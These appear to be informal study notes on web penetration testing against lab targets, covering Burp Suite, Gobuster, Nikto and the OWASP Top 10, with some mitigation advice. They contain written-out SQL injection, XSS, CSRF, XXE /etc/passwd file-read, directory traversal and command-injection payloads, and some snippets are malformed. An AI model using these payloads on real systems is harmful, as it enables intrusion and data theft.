#Burp Suite

Proxy on browser -> 127.0.0

target /intercetp 
confirm proxy


# SQL norm admin' or 1=1"--
#D

spidering

adding to scope


# wasp zap

spidering 

forced dir

# Dirbuster



# cross site scripting
```
<script> alert("script")

<script>

client
<img src="" onerror="alert("ww")">
```

# Cross site scripting  Request forger
```
create login 

burp => httmp proxy ->select-> reapeter 
```
```
<script>
xmlhttp = XMLHttpRequest;
xmlhttp.open('GET', 'http://192.168.56.101/dvwa/vulnerabilities/csrf/?password_new=yyy&password_conf=yyy&Change=Change');
xmlhttp.send()
<script>
```
# cookie collection and reverse engineering

get auth cookie token

decode token jsonwebtoken.io

decript any hash 

# http attribute (cookie stealing)

# Sql Injection

` 'or 1=1 --  `

# Go buster
```
sudo gobuster dir -u 10.10.46.221:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

# Nikto

`nikto -h 10.10.46.221:80`

`nikto -h 10.10.50.194:1234/manager/html -id bob:bubbles`
# Mimes, UTF encoding, origin Matching Same origin policy
# Post messaging into iFrame
# CORS CSRF TOKENS 

# XXS Recog (when passed through burp)
* Figure out where data goes, does it get embeded in a tag? Does it get embededded into a string in script tag?
* Figure out aby special handling, Do urls get turned into links, like posts in lvl 1? 
* Figure out how special characters are handled: A good way is to input something like '<>:;"

# Exploit
* use normal alert or if WAF use <img> with bad source omError
* "onmouseover="alert(0);
* http://"onmouseover="alert(0);
* <a href="http://doo.com"style"....">
* html encoding payload : ';alert(1);' 
* *  give final script of <script> var token='';alert(1);'';</script>
* Js string-escaped payload : </script><script> alert(1);</script>

* "><h1>test</h1>
* '+alert(1)+'

# Mitigation 

* Not enought to escape string but replace < with \x3c and > with \x3e hex escape

# Sql Injection and friend
* reveal files "../../../../etc/passwd -> directory traveral
* cmd inject ping google.com;echo test %or; -- Backticks E.g `echo google.com` works as ping google.com
* Sql injection -> 
* * Union : rubish')) UNION SELECT '1', '2', '3', 'password' ... FROM Users --
* * use sleep(1000) in GET /api/users

# Mitigation
* Never Allow user use path seprators /\
* Rarely allow user input run or e.g escapeshellcmd() in php that functions escapse #&;`|?`<
^()[]{}$\, \x0A, \xFF and anu unbalanced code
* Ensure all inputs are proper qualted and passed through proper escaping functions e.g mysql_real_escape_string() in PHP
* USe parameterised quaries
* Use and orm for data access instead of direct queries

# OWASP TOP 10

# 1 Injection -> Command

# 2 Broken Auth Register same user with " " vuln
`register an already made username like admin`
# 3 Sensitive data exposure 
`Navigating directories`
```
Snooping Databases
download db file 
sqlite 3 <db>
Usage 
    .tables
    PRAGMA table_info(table);
    SELECT * FROM table
Crack -> Crackstation.net
```

# 4 XML Entity
```
An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.
```
```
There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.
```
`prolog`
`<?xml version="1.0" encoding="UTF-8"?>` 
```
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```
```
DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML docum
```
```
Let us try to understand this with the help of an example. Say we have a file named note.dtd with the following content:

<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```
`<!DOCTYPE note SYSTEM "note.dtd">`



Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>

```
As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.


# 5 Broken access contorol (IDOR, or Insecure Direct Object Reference)

` Basically abusing the GET -> ?para=1&`

# 6 sECURITy Misconfig
` Source code and research templates default passwords`

# 7 Cross-site scripting

`http://www.xss-payloads.com`

`document.cookie`
`window.location.hostname`
`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`

# Insecure Deserialize<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>

# 8 Insecure Deserialization
` cookie decode`
` base 64`
` Reverse shell by encoding bas64 payload with python rce.py`

# 9 Components with known vulnerabil

`research for remote code vuln`
`use`

# 10 Insufficient Logging -> Self explanat



